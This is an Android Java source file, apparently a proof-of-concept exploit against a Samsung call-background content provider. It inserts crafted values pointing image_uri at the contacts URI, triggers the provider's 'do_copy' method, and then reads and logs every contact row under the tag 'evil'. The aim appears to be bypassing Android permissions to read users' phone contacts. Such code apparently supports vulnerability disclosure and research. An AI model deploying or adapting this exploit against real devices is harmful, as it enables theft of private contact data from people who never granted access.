package poc.app;

import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final Uri grantAccessUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        try {
            // puts data to shared prefs
            ContentValues values = new ContentValues();
            values.put("image_uri", grantAccessUri.toString());
            values.put("is_selected_sim2", true);

            // non null values
            values.put("is_default", true);
            values.put("is_preloaded", true);
            values.put("is_selected_sim1", true);
            values.put("type", "");

            Uri returnedUri = getContentResolver().insert(Uri.parse("content://com.samsung.android.callbgprovider.media/"), values);
            Log.d("evil", "Returned: " + returnedUri);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }

        try {
            // calls the provider to add data
            getContentResolver().call("com.samsung.android.callbgprovider.media", "do_copy", null, null);
        } catch (Throwable th) {
        }

        dump(grantAccessUri);
    }

    public void dump(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if(sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
}